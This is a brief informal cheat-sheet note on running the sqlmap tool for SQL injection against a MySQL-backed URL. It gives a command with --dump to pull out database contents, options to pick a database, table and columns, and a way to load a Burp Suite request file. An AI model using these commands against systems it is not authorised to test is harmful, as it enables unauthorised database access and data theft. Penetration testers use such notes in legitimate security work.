sqlmap -u "<URL>" --dbms=mysql -p <Vulnerable_parameter(If known)> --dump (Forgot this dump lol)
(Use dump after you are sure about which database you want to attack and which table too and you can brute force them all..even columns)

after done deciding:
use -D <DB_NAME> -T <Table_name>(If known) 

you can even use -r <BurpSuite_output.txt>

and it will figure out the params and try injecting them